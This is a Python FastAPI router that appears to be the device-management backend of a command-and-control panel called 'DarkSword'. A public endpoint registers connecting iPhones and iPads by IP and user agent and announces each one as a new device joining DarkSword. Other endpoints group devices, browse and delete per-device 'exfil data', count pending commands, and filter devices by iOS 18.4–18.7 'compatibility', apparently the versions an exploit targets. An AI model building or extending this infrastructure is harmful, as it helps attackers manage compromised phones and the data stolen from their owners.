from fastapi import APIRouter, Depends, HTTPException, Request
from sqlalchemy.orm import Session
from sqlalchemy import desc, asc, func, or_, and_
from pydantic import BaseModel, Field
from typing import Optional, List
import re
import uuid as _uuid
from datetime import datetime

from ..database import get_db, Device, DeviceGroup, Log, ExfilData, Command, create_audit_log
from ..auth import get_current_user
from ..schemas import DeviceResponse, LogResponse, ExfilDataResponse
from .notifications import broadcast_notification_sync
from ..limiter import rate_limit

router = APIRouter(prefix="/api/devices", tags=["devices"], redirect_slashes=False)


# ============== Pydantic 请求体 ==============
class DeviceRegisterRequest(BaseModel):
    device_uuid: Optional[str] = Field(None, description="设备UUID，为空则自动生成")
    user_agent: Optional[str] = Field(None, description="浏览器User-Agent")
    force_is_new: Optional[bool] = Field(False, description="调用方已知是新设备，强制触发新设备通知")
    force_was_offline: Optional[bool] = Field(False, description="调用方已知是离线回线，强制触发重新上线通知")
    extra: Optional[dict] = Field(default_factory=dict)


class GroupCreate(BaseModel):
    name: str = Field(..., min_length=1, max_length=100)
    color: Optional[str] = "#409EFF"
    description: Optional[str] = ""


class GroupUpdate(BaseModel):
    name: Optional[str] = Field(None, min_length=1, max_length=100)
    color: Optional[str] = None
    description: Optional[str] = None


class BatchDeleteRequest(BaseModel):
    device_uuids: List[str] = Field(..., min_length=1)


class BatchSetGroupRequest(BaseModel):
    device_uuids: List[str] = Field(..., min_length=1)
    group_id: Optional[int] = None


class BatchSetStatusRequest(BaseModel):
    device_uuids: List[str] = Field(..., min_length=1)
    status: str = Field(..., pattern="^(active|offline)$")


class DevicePatchRequest(BaseModel):
    group_id: Optional[int] = None
    note: Optional[str] = None
    status: Optional[str] = None


# ============== 辅助 ==============
SUPPORTED_IOS_VERSIONS = {"18.4", "18.5", "18.6", "18.7"}


def _parse_device_info(device: Device):
    """根据 user_agent 解析设备信息（os_version, safari_version, device_model, chipset）."""
    if not device.user_agent:
        return
    version_match = re.search(r'Version/([0-9.]+)', device.user_agent)
    if version_match:
        device.os_version = version_match.group(1)
    safari_match = re.search(r'Safari/([0-9.]+)', device.user_agent)
    if safari_match:
        device.safari_version = safari_match.group(1)
    if not device.device_model:
        if 'iPhone' in device.user_agent:
            device.device_model = 'iPhone'
        elif 'iPad' in device.user_agent:
            device.device_model = 'iPad'
        elif 'iPod' in device.user_agent:
            device.device_model = 'iPod Touch'
    if device.os_version and device.device_model and not device.chipset:
        version_map = {
            '18.7': 'A17 Pro / A18',
            '18.6': 'A17 Pro / A18',
            '18.5': 'A17 Pro / A18',
            '18.4': 'A17 Pro / A18',
        }
        device.chipset = version_map.get(device.os_version)


def _is_ios_compatible(os_version: Optional[str]) -> Optional[str]:
    """返回 'compatible' / 'too_low' / 'too_high' / None（未知）."""
    if not os_version:
        return None
    if os_version in SUPPORTED_IOS_VERSIONS:
        return "compatible"
    parts = os_version.split(".")
    try:
        major = int(parts[0])
        minor = int(parts[1]) if len(parts) > 1 else 0
    except (ValueError, TypeError):
        return None
    if major < 18 or (major == 18 and minor < 4):
        return "too_low"
    return "too_high"


# ============== 设备注册/心跳 ==============
@router.post("/register")
async def register_device(
    request: Request,
    payload: DeviceRegisterRequest,
    db: Session = Depends(get_db)
):
    """设备注册/心跳接口（公开）：新设备上线触发通知，离线设备重新上线也触发通知."""
    client_ip = request.client.host if request.client else None
    ua = payload.user_agent or (request.headers.get("user-agent") or "")
    uuid = payload.device_uuid or None

    if not uuid:
        if ua and any(k in ua for k in ("iPhone", "iPad", "iPod", "iOS")):
            uuid = "ios-" + _uuid.uuid4().hex[:16]
        else:
            uuid = "dev-" + _uuid.uuid4().hex[:16]

    device = db.query(Device).filter(Device.device_uuid == uuid).first()
    now = datetime.now()
    is_new = device is None
    was_offline = False

    if is_new:
        device = Device(
            device_uuid=uuid,
            first_seen=now,
            last_seen=now,
            ip=client_ip,
            user_agent=ua,
            status="active",
        )
        _parse_device_info(device)
        db.add(device)
    else:
        was_offline = device.status == "offline"
        device.last_seen = now
        device.ip = client_ip or device.ip
        if ua:
            device.user_agent = ua
            _parse_device_info(device)
        device.status = "active"

    try:
        db.commit()
        db.refresh(device)
    except Exception:
        db.rollback()
        raise

    if is_new:
        model_desc = f"{device.device_model or '未知型号'} {('/ iOS ' + device.os_version) if device.os_version else ''}".strip()
        broadcast_notification_sync(
            db,
            title="🔔 新设备上线",
            message=f"新设备 {uuid[:10]}... 已接入 DarkSword\n型号: {model_desc}\nIP: {client_ip or '未知'}",
            category="device",
            related_device_uuid=uuid,
            related_resource_type="device",
            related_resource_id=uuid,
        )
    elif was_offline or payload.force_was_offline:
        model_desc = f"{device.device_model or '未知型号'} {('/ iOS ' + device.os_version) if device.os_version else ''}".strip()
        broadcast_notification_sync(
            db,
            title="✅ 设备重新上线",
            message=f"设备 {uuid[:10]}... 重新上线\n型号: {model_desc}\nIP: {client_ip or '未知'}",
            category="device",
            related_device_uuid=uuid,
            related_resource_type="device",
            related_resource_id=uuid,
        )
    elif payload.force_is_new:
        model_desc = f"{device.device_model or '未知型号'} {('/ iOS ' + device.os_version) if device.os_version else ''}".strip()
        broadcast_notification_sync(
            db,
            title="🔔 新设备上线",
            message=f"新设备 {uuid[:10]}... 已接入 DarkSword\n型号: {model_desc}\nIP: {client_ip or '未知'}",
            category="device",
            related_device_uuid=uuid,
            related_resource_type="device",
            related_resource_id=uuid,
        )

    return {
        "device_uuid": uuid,
        "status": device.status,
        "is_new": is_new,
        "was_offline": was_offline,
        "device_model": device.device_model,
        "os_version": device.os_version,
        "group_id": device.group_id,
    }


# ============== 分组 CRUD ==============
def _serialize_group(g: DeviceGroup, db: Optional[Session] = None):
    d = {
        "id": g.id,
        "name": g.name,
        "color": g.color or "#409EFF",
        "description": g.description or "",
        "created_at": g.created_at.isoformat() if g.created_at else None,
        "updated_at": g.updated_at.isoformat() if g.updated_at else None,
        "device_count": 0,
    }
    if db is not None:
        try:
            d["device_count"] = db.query(func.count(Device.id)).filter(Device.group_id == g.id).scalar() or 0
        except Exception:
            d["device_count"] = 0
    return d


@router.get("/groups")
async def list_groups(db: Session = Depends(get_db), current_user=Depends(get_current_user)):
    groups = db.query(DeviceGroup).order_by(asc(DeviceGroup.name)).all()
    items = [_serialize_group(g, db) for g in groups]
    # 计算未分组设备数
    ungrouped = db.query(func.count(Device.id)).filter(Device.group_id.is_(None)).scalar() or 0
    return {"total": len(items), "items": items, "ungrouped_count": ungrouped}


@router.post("/groups")
async def create_group(
    request: Request,
    payload: GroupCreate,
    db: Session = Depends(get_db),
    current_user=Depends(get_current_user)
):
    exists = db.query(DeviceGroup).filter(DeviceGroup.name == payload.name.strip()).first()
    if exists:
        raise HTTPException(status_code=400, detail="分组名称已存在")
    g = DeviceGroup(
        name=payload.name.strip(),
        color=payload.color or "#409EFF",
        description=payload.description or "",
    )
    db.add(g)
    db.commit()
    db.refresh(g)
    username = current_user.username if current_user else "anonymous"
    create_audit_log(db, username=username, action="device_group_create", resource_type="device_group",
                     resource_id=str(g.id), detail=f"创建设备分组 {g.name}",
                     ip_address=request.client.host if request.client else None)
    return _serialize_group(g, db)


@router.patch("/groups/{group_id}")
async def update_group(
    request: Request,
    group_id: int,
    payload: GroupUpdate,
    db: Session = Depends(get_db),
    current_user=Depends(get_current_user)
):
    g = db.query(DeviceGroup).filter(DeviceGroup.id == group_id).first()
    if not g:
        raise HTTPException(status_code=404, detail="分组不存在")
    if payload.name is not None:
        name = payload.name.strip()
        other = db.query(DeviceGroup).filter(DeviceGroup.name == name, DeviceGroup.id != g.id).first()
        if other:
            raise HTTPException(status_code=400, detail="分组名称已存在")
        g.name = name
    if payload.color is not None:
        g.color = payload.color
    if payload.description is not None:
        g.description = payload.description
    g.updated_at = datetime.now()
    db.commit()
    db.refresh(g)
    username = current_user.username if current_user else "anonymous"
    create_audit_log(db, username=username, action="device_group_update", resource_type="device_group",
                     resource_id=str(g.id), detail=f"更新设备分组 {g.name}",
                     ip_address=request.client.host if request.client else None)
    return _serialize_group(g, db)


@router.delete("/groups/{group_id}")
async def delete_group(
    request: Request,
    group_id: int,
    move_devices_to_group_id: Optional[int] = None,
    db: Session = Depends(get_db),
    current_user=Depends(get_current_user)
):
    g = db.query(DeviceGroup).filter(DeviceGroup.id == group_id).first()
    if not g:
        raise HTTPException(status_code=404, detail="分组不存在")
    old_name = g.name
    if move_devices_to_group_id is not None and move_devices_to_group_id > 0:
        target = db.query(DeviceGroup).filter(DeviceGroup.id == move_devices_to_group_id).first()
        if not target:
            raise HTTPException(status_code=400, detail="目标分组不存在")
        db.query(Device).filter(Device.group_id == group_id).update({Device.group_id: move_devices_to_group_id})
    else:
        # 删除分组 → 把原来在这个分组下的设备改成未分组
        db.query(Device).filter(Device.group_id == group_id).update({Device.group_id: None})
    db.delete(g)
    db.commit()
    username = current_user.username if current_user else "anonymous"
    create_audit_log(db, username=username, action="device_group_delete", resource_type="device_group",
                     resource_id=str(group_id), detail=f"删除设备分组 {old_name}",
                     ip_address=request.client.host if request.client else None)
    return {"message": "Group deleted"}


# ============== 设备查询（扩展搜索/筛选/排序/分页） ==============
@router.get("")
async def get_devices(
    skip: int = 0,
    limit: int = 100,
    search: Optional[str] = None,
    status: Optional[str] = None,
    device_uuid: Optional[str] = None,
    ip: Optional[str] = None,
    group_id: Optional[int] = None,
    ungrouped_only: Optional[bool] = False,
    os_version: Optional[str] = None,
    device_model: Optional[str] = None,
    compatible: Optional[str] = None,
    first_seen_from: Optional[str] = None,
    first_seen_to: Optional[str] = None,
    last_seen_from: Optional[str] = None,
    last_seen_to: Optional[str] = None,
    sort: Optional[str] = "last_seen",
    order: Optional[str] = "desc",
    db: Session = Depends(get_db),
    current_user=Depends(get_current_user)
):
    query = db.query(Device)

    # 关键字模糊搜索
    if search and search.strip():
        q = search.strip()
        like = f"%{q}%"
        query = query.filter(or_(
            Device.device_uuid.like(like),
            Device.ip.like(like),
            Device.device_model.like(like),
            Device.os_version.like(like),
            Device.chipset.like(like),
            Device.user_agent.like(like),
            Device.note.like(like),
        ))

    # 简单相等匹配
    if status:
        query = query.filter(Device.status == status)
    if device_uuid:
        query = query.filter(Device.device_uuid.contains(device_uuid))
    if ip:
        query = query.filter(Device.ip.contains(ip))
    if group_id is not None:
        query = query.filter(Device.group_id == group_id)
    if ungrouped_only:
        query = query.filter(Device.group_id.is_(None))
    if os_version:
        query = query.filter(Device.os_version == os_version)
    if device_model:
        query = query.filter(Device.device_model == device_model)

    # 时间范围
    def _parse_dt(s):
        if not s: return None
        try:
            if len(s) == 10:
                return datetime.strptime(s, "%Y-%m-%d")
            return datetime.fromisoformat(s.replace("Z", "+00:00").replace("+00:00", ""))
        except Exception:
            return None

    fs_from = _parse_dt(first_seen_from)
    fs_to = _parse_dt(first_seen_to)
    ls_from = _parse_dt(last_seen_from)
    ls_to = _parse_dt(last_seen_to)
    if fs_from: query = query.filter(Device.first_seen >= fs_from)
    if fs_to: query = query.filter(Device.first_seen <= fs_to)
    if ls_from: query = query.filter(Device.last_seen >= ls_from)
    if ls_to: query = query.filter(Device.last_seen <= ls_to)

    # 兼容级别（前端筛选）
    if compatible:
        all_rows = query.with_entities(Device.id, Device.os_version).all()
        matched_ids = set()
        for rid, ver in all_rows:
            c = _is_ios_compatible(ver)
            if compatible == c or (compatible == "unknown" and c is None):
                matched_ids.add(rid)
        if not matched_ids:
            return {"total": 0, "items": []}
        query = query.filter(Device.id.in_(matched_ids))

    total = query.count()

    # 排序
    order_func = desc if (order or "desc").lower() != "asc" else asc
    sort_col = {
        "last_seen": Device.last_seen,
        "first_seen": Device.first_seen,
        "os_version": Device.os_version,
        "device_model": Device.device_model,
        "status": Device.status,
        "ip": Device.ip,
        "group_id": Device.group_id,
    }.get((sort or "last_seen").lower(), Device.last_seen)
    query = query.order_by(order_func(sort_col))

    devices = query.offset(skip).limit(limit).all()

    # 附带分组信息
    group_map = {}
    try:
        group_ids = [d.group_id for d in devices if d.group_id is not None]
        if group_ids:
            for g in db.query(DeviceGroup).filter(DeviceGroup.id.in_(group_ids)).all():
                group_map[g.id] = {"id": g.id, "name": g.name, "color": g.color}
    except Exception:
        group_map = {}

    def _to_dict(d: Device):
        dct = {c.name: getattr(d, c.name) for c in d.__table__.columns}
        if isinstance(dct.get("first_seen"), datetime):
            dct["first_seen"] = dct["first_seen"].isoformat()
        if isinstance(dct.get("last_seen"), datetime):
            dct["last_seen"] = dct["last_seen"].isoformat()
        if isinstance(dct.get("last_command_time"), datetime):
            dct["last_command_time"] = dct["last_command_time"].isoformat()
        if d.group_id and d.group_id in group_map:
            dct["group"] = group_map[d.group_id]
        else:
            dct["group"] = None
        # 兼容性等级返回，方便前端直接用
        dct["compatible_level"] = _is_ios_compatible(d.os_version)
        return dct

    return {"total": total, "items": [_to_dict(d) for d in devices]}


# ============== 统计 ==============
@router.get("/stats")
async def get_device_stats(db: Session = Depends(get_db), current_user=Depends(get_current_user)):
    total_devices = db.query(func.count(Device.id)).scalar()
    active_devices = db.query(func.count(Device.id)).filter(Device.status == "active").scalar()
    offline_devices = db.query(func.count(Device.id)).filter(Device.status == "offline").scalar()

    total_exfil = db.query(func.count(ExfilData.id)).scalar()
    total_commands = db.query(func.count(Command.id)).scalar()
    pending_commands = db.query(func.count(Command.id)).filter(Command.status == "pending").scalar()

    by_os_version = db.query(Device.os_version, func.count(Device.id)).group_by(Device.os_version).all()
    by_model = db.query(Device.device_model, func.count(Device.id)).group_by(Device.device_model).all()
    by_group = db.query(Device.group_id, func.count(Device.id)).group_by(Device.group_id).all()
    group_map = {}
    try:
        for g in db.query(DeviceGroup).all():
            group_map[g.id] = g.name
    except Exception:
        pass
    by_group_dict = {}
    for gid, cnt in by_group:
        if gid is None:
            by_group_dict["未分组"] = cnt
        else:
            by_group_dict[group_map.get(gid, f"分组{gid}")] = cnt

    return {
        "total_devices": total_devices or 0,
        "active_devices": active_devices or 0,
        "offline_devices": offline_devices or 0,
        "total_exfil": total_exfil or 0,
        "total_commands": total_commands or 0,
        "pending_commands": pending_commands or 0,
        "by_os_version": dict(by_os_version),
        "by_model": dict(by_model),
        "by_group": by_group_dict,
    }


@router.post("/refresh-all")
async def refresh_all_devices(db: Session = Depends(get_db), current_user=Depends(get_current_user)):
    devices = db.query(Device).all()
    updated = 0

    for device in devices:
        if device.user_agent:
            version_match = re.search(r'Version/([0-9.]+)', device.user_agent)
            if version_match:
                device.os_version = version_match.group(1)

            safari_match = re.search(r'Safari/([0-9.]+)', device.user_agent)
            if safari_match:
                device.safari_version = safari_match.group(1)

            if not device.device_model:
                if 'iPhone' in device.user_agent:
                    device.device_model = 'iPhone'
                elif 'iPad' in device.user_agent:
                    device.device_model = 'iPad'
                elif 'iPod' in device.user_agent:
                    device.device_model = 'iPod Touch'

            if device.os_version and device.device_model and not device.chipset:
                version_map = {
                    '18.7': 'A17 Pro / A18',
                    '18.6': 'A17 Pro / A18',
                    '18.5': 'A17 Pro / A18',
                    '18.4': 'A17 Pro / A18',
                }
                device.chipset = version_map.get(device.os_version)

            updated += 1

    db.commit()
    return {"message": f"Refreshed {updated} devices"}


# ============== 单设备详情 ==============
@router.get("/{device_uuid}", response_model=DeviceResponse)
async def get_device(device_uuid: str, db: Session = Depends(get_db), current_user=Depends(get_current_user)):
    device = db.query(Device).filter(Device.device_uuid == device_uuid).first()
    if not device:
        raise HTTPException(status_code=404, detail="Device not found")
    return device


@router.patch("/{device_uuid}")
async def patch_device(
    request: Request,
    device_uuid: str,
    payload: DevicePatchRequest,
    db: Session = Depends(get_db),
    current_user=Depends(get_current_user)
):
    device = db.query(Device).filter(Device.device_uuid == device_uuid).first()
    if not device:
        raise HTTPException(status_code=404, detail="Device not found")
    changes = []
    if payload.group_id is not None:
        if payload.group_id <= 0:
            if device.group_id is not None:
                changes.append(f"group_id: {device.group_id} -> NULL(未分组)")
            device.group_id = None
        else:
            g = db.query(DeviceGroup).filter(DeviceGroup.id == payload.group_id).first()
            if not g:
                raise HTTPException(status_code=400, detail="分组不存在")
            changes.append(f"group_id -> {g.name}")
            device.group_id = payload.group_id
    if hasattr(payload, "note") and payload.note is not None:
        new_note = (payload.note or "").strip() or None
        if (device.note or "") != (new_note or ""):
            changes.append(f"note updated ({len(new_note or '')} chars)")
        device.note = new_note
    if payload.status is not None and payload.status in ("active", "offline"):
        if device.status != payload.status:
            changes.append(f"status: {device.status} -> {payload.status}")
        device.status = payload.status
    db.commit()
    db.refresh(device)
    if changes:
        username = current_user.username if current_user else "anonymous"
        create_audit_log(db, username=username, action="device_update", resource_type="device",
                         resource_id=device_uuid, detail="; ".join(changes),
                         ip_address=request.client.host if request.client else None)
    return {"device_uuid": device_uuid, "group_id": device.group_id, "note": device.note, "status": device.status}


@router.get("/{device_uuid}/logs", response_model=List[LogResponse])
async def get_device_logs(
    device_uuid: str,
    skip: int = 0,
    limit: int = 100,
    db: Session = Depends(get_db),
    current_user=Depends(get_current_user)
):
    device = db.query(Device).filter(Device.device_uuid == device_uuid).first()
    if not device:
        raise HTTPException(status_code=404, detail="Device not found")

    logs = db.query(Log).filter(or_(
        Log.device_uuid == device_uuid,
        Log.ip == device.ip
    )).order_by(desc(Log.timestamp)).offset(skip).limit(limit).all()
    return logs


@router.get("/{device_uuid}/exfil", response_model=List[ExfilDataResponse])
async def get_device_exfil(
    device_uuid: str,
    skip: int = 0,
    limit: int = 100,
    db: Session = Depends(get_db),
    current_user=Depends(get_current_user)
):
    device = db.query(Device).filter(Device.device_uuid == device_uuid).first()
    if not device:
        raise HTTPException(status_code=404, detail="Device not found")

    exfil = db.query(ExfilData).filter(ExfilData.device_uuid == device_uuid).order_by(desc(ExfilData.uploaded_at)).offset(skip).limit(limit).all()
    return exfil


@router.post("/{device_uuid}/refresh")
async def refresh_device_info(device_uuid: str, db: Session = Depends(get_db), current_user=Depends(get_current_user)):
    device = db.query(Device).filter(Device.device_uuid == device_uuid).first()
    if not device:
        raise HTTPException(status_code=404, detail="Device not found")

    if device.user_agent:
        version_match = re.search(r'Version/([0-9.]+)', device.user_agent)
        if version_match:
            device.os_version = version_match.group(1)

        safari_match = re.search(r'Safari/([0-9.]+)', device.user_agent)
        if safari_match:
            device.safari_version = safari_match.group(1)

        if not device.device_model:
            if 'iPhone' in device.user_agent:
                device.device_model = 'iPhone'
            elif 'iPad' in device.user_agent:
                device.device_model = 'iPad'
            elif 'iPod' in device.user_agent:
                device.device_model = 'iPod Touch'

        if device.os_version and device.device_model:
            version_map = {
                '18.7': 'A17 Pro / A18',
                '18.6': 'A17 Pro / A18',
                '18.5': 'A17 Pro / A18',
                '18.4': 'A17 Pro / A18',
            }
            device.chipset = version_map.get(device.os_version)

    db.commit()
    return {"message": "Device info refreshed", "device": device}


# ============== 批量操作 ==============
@router.post("/batch-delete")
async def batch_delete_devices(
    request: Request,
    payload: BatchDeleteRequest,
    db: Session = Depends(get_db),
    current_user=Depends(get_current_user)
):
    uuids = list(payload.device_uuids)
    if not uuids:
        raise HTTPException(status_code=400, detail="未提供设备 UUID")
    devices = db.query(Device).filter(Device.device_uuid.in_(uuids)).all()
    if not devices:
        return {"deleted": 0}
    deleted_count = 0
    username = current_user.username if current_user else "anonymous"
    for dev in devices:
        du = dev.device_uuid
        try:
            db.query(ExfilData).filter(ExfilData.device_uuid == du).delete()
            db.delete(dev)
            deleted_count += 1
        except Exception:
            db.rollback()
            raise
    db.commit()
    if deleted_count:
        detail_summary = f"{uuids[0][:10]}..." if len(uuids) == 1 else f"{len(uuids)}台设备"
        create_audit_log(db, username=username, action="device_batch_delete", resource_type="device",
                         resource_id=",".join(uuids)[:200],
                         detail=f"批量删除 {deleted_count} 台设备: {detail_summary}",
                         ip_address=request.client.host if request.client else None)
        broadcast_notification_sync(
            db, title="设备批量删除", message=f"用户 {username} 批量删除了 {deleted_count} 台设备",
            category="device", related_resource_type="device"
        )
    return {"deleted": deleted_count}


@router.post("/batch-set-group")
async def batch_set_group(
    request: Request,
    payload: BatchSetGroupRequest,
    db: Session = Depends(get_db),
    current_user=Depends(get_current_user)
):
    uuids = list(payload.device_uuids)
    if not uuids:
        raise HTTPException(status_code=400, detail="未提供设备 UUID")
    gid = payload.group_id
    if gid is not None and gid > 0:
        target = db.query(DeviceGroup).filter(DeviceGroup.id == gid).first()
        if not target:
            raise HTTPException(status_code=400, detail="目标分组不存在")
    else:
        gid = None  # 移到未分组
    updated = db.query(Device).filter(Device.device_uuid.in_(uuids)).update({Device.group_id: gid}, synchronize_session=False)
    db.commit()
    if updated:
        username = current_user.username if current_user else "anonymous"
        group_label = "未分组" if gid is None else (
            db.query(DeviceGroup.name).filter(DeviceGroup.id == gid).scalar() or f"分组{gid}"
        )
        create_audit_log(db, username=username, action="device_batch_group", resource_type="device",
                         resource_id=",".join(uuids)[:200],
                         detail=f"将 {updated} 台设备移动到分组 [{group_label}]",
                         ip_address=request.client.host if request.client else None)
    return {"updated": updated}


@router.post("/batch-set-status")
async def batch_set_status(
    request: Request,
    payload: BatchSetStatusRequest,
    db: Session = Depends(get_db),
    current_user=Depends(get_current_user)
):
    uuids = list(payload.device_uuids)
    if not uuids:
        raise HTTPException(status_code=400, detail="未提供设备 UUID")
    updated = db.query(Device).filter(Device.device_uuid.in_(uuids)).update(
        {Device.status: payload.status}, synchronize_session=False
    )
    db.commit()
    if updated:
        username = current_user.username if current_user else "anonymous"
        create_audit_log(db, username=username, action="device_batch_status", resource_type="device",
                         resource_id=",".join(uuids)[:200],
                         detail=f"将 {updated} 台设备状态改为 {payload.status}",
                         ip_address=request.client.host if request.client else None)
    return {"updated": updated}


# ============== 单台删除（保持兼容） ==============
@rate_limit("10/minute")
@router.delete("/{device_uuid}")
async def delete_device(request: Request, device_uuid: str, db: Session = Depends(get_db), current_user=Depends(get_current_user)):
    device = db.query(Device).filter(Device.device_uuid == device_uuid).first()
    if not device:
        raise HTTPException(status_code=404, detail="Device not found")

    db.query(ExfilData).filter(ExfilData.device_uuid == device_uuid).delete()
    db.delete(device)
    db.commit()

    username = current_user.username if current_user else "anonymous"
    create_audit_log(
        db, username=username, action="device_delete", resource_type="device",
        resource_id=device_uuid, detail=f"Deleted device {device_uuid} and related exfil data",
        ip_address=request.client.host if request.client else None
    )
    broadcast_notification_sync(
        db, title="设备已删除", message=f"用户 {username} 删除了设备 {device_uuid[:10]}...",
        category="device", related_device_uuid=device_uuid, related_resource_type="device",
        related_resource_id=device_uuid
    )
    return {"message": "Device deleted"}
